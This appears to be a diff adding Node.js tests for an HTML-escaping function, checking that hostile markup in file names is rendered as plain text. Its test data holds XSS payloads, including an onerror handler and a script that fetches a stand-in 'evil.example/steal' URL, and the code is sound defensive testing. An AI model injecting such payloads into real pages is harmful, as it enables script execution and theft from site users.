+import assert from "node:assert/strict";
+import { test } from "node:test";
+import { escapeHtml } from "../src/escape.js";
+
+// Hostile values on purpose: the tests check that they come out as plain text.
+const ATTACKS = [
+  [
+    '<img src="x" onerror="alert(1)">',
+    "&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt;",
+  ],
+  [
+    '<script>fetch("https://evil.example/steal")</script>',
+    "&lt;script&gt;fetch(&quot;https://evil.example/steal&quot;)&lt;/script&gt;",
+  ],
+  ["<!-- reviewops -->", "&lt;!-- reviewops --&gt;"],
+];
+
+test("turns markup in a file name into plain text", () => {
+  for (const [attack, expected] of ATTACKS) {
+    assert.equal(escapeHtml(attack), expected);
+  }
+});
+
+test("leaves link syntax and mentions alone, it only escapes HTML", () => {
+  assert.equal(escapeHtml("[docs](https://evil.example/login)"), "[docs](https://evil.example/login)");
+  assert.equal(escapeHtml("@octocat please merge"), "@octocat please merge");
+});
+
+test("escapes the ampersand first, so an entity is not escaped twice", () => {
+  assert.equal(escapeHtml("a &lt; b"), "a &amp;lt; b");
+});
